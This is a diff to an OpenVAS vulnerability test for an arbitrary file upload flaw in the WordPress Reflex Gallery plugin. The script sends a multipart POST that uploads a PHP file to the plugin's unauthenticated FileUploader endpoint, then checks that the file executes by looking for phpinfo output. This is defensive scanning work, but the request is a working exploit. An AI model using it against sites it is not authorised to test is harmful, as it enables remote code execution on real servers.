@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wp_reflex_gallery_arbit_file_upload_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
+# $Id: gb_wp_reflex_gallery_arbit_file_upload_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # Wordpress Reflex Gallery Arbitrary File Upload Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805154");
-  script_version("$Revision: 13659 $");
+  script_version("$Revision: 13994 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2015-03-17 16:10:09 +0530 (Tue, 17 Mar 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Wordpress Reflex Gallery Arbitrary File Upload Vulnerability");
@@ -65,33 +65,36 @@ if(description)
   script_mandatory_keys("wordpress/installed");
   script_require_ports("Services/www", 80);
   script_xref(name:"URL", value:"https://wordpress.org/plugins/reflex-gallery");
+
   exit(0);
 }
-
 
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
-if(!http_port = get_app_port(cpe:CPE)){
+if(!http_port = get_app_port(cpe:CPE))
   exit(0);
-}
 
-if(!dir = get_app_location(cpe:CPE, port:http_port)){
+if(!dir = get_app_location(cpe:CPE, port:http_port))
   exit(0);
-}
 
-## Plugin URL
-url = dir + '/wp-content/plugins/reflex-gallery/reflex-gallery.php';
-wpReq = http_get(item: url,  port:http_port);
+if(dir == "/")
+  dir = "";
+
+host = http_host_name(port:http_port);
+
+url = dir + "/wp-content/plugins/reflex-gallery/reflex-gallery.php";
+wpReq = http_get(item:url, port:http_port);
 wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:FALSE);
-useragent = http_get_user_agent();
-vtstring = get_vt_string();
 
-if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
-{
-  fileName = vtstring + '_' + rand() + '.php';
+if(wpRes && wpRes =~ "^HTTP/1\.[01] 200") {
+
+  useragent = http_get_user_agent();
+  vtstrings = get_vt_strings();
+
+  fileName = vtstrings["lowercase_rand"] + ".php";
 
   url = dir + '/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2015&Month=03';
 
@@ -104,7 +107,7 @@ if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
                     'Pwn!\r\n', '------------7nLRJ4OOOKgWZky9bsIqMS--');
 
   sndReq = string("POST ", url, " HTTP/1.1\r\n",
-                  "Host: ", get_host_name(), "\r\n",
+                  "Host: ", host, "\r\n",
                   "User-Agent: ", useragent, "\r\n",
                   "Content-Length: ", strlen(postData), "\r\n",
                   "Content-Type: multipart/form-data; boundary=----------7nLRJ4OOOKgWZky9bsIqMS\r\n\r\n",
@@ -112,11 +115,10 @@ if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
 
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  if('success":true' >< rcvRes && vtstring + '_' >< rcvRes)
+  if('success":true' >< rcvRes && vtstrings["lowercase"] + '_' >< rcvRes)
   {
-    ## Uploaded file URL
-    url = dir + '/wp-content/uploads/2015/03/' + fileName;
 
+    url = dir + '/wp-content/uploads/2015/03/' + fileName;
     if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
        pattern:">phpinfo\(\)<", extra_check:">System"))
     {
